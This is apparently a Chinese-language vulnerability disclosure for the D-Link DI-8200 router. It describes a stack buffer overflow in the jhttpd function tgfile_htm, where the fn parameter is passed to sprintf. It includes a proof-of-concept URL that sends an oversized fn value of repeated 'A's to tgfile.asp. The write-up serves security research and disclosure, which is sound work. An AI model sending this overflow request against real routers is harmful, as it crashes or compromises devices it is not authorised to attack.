# DI-8200 0Day
# 产品介绍
D-Link旗下宽带路由器
D-Link DI-8200是D-Link专为中小型网络环境设计的宽带路由器，支持最多4个互联网端口和最多4个局域网端口。它采用网络专用处理器，性能优越，能满足120个用户同时上网的需求。支持多线路带宽叠加，PPPOE认证计费、WEB认证计费，DNS缓存服务器，多LAN口VLAN隔离，酒店模式，智能流量控制，IP-MAC地址绑定，上网行为管理，VPN应用等功能。内置硬件防火墙，能有效防范DDoS类攻击，ARP欺骗等病毒入侵。
# 固件模拟
使用FirmAE直接运行即可模拟DI-8200
![image](https://github.com/user-attachments/assets/6f66ad80-afdb-4bf7-a115-b8e453988b75)

# tgfile_htm
在二进制文件jhttpd中，`tgfile_htm`函数中,参数`fn`可控。
![image](https://github.com/user-attachments/assets/327178d1-b294-4b47-b830-df4de8825696)

使用`sprintf`拼接到栈上，如果`fn`参数过长，触发栈溢出。
## POC 
注：此攻击方法需要授权，普通用户进入登录页面，然后直接请求以下URL即可
```http
http://192.168.0.1/tgfile.asp?fn=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
## Result
![image](https://github.com/user-attachments/assets/62de3b84-ad1a-496e-be69-b38781d22308)
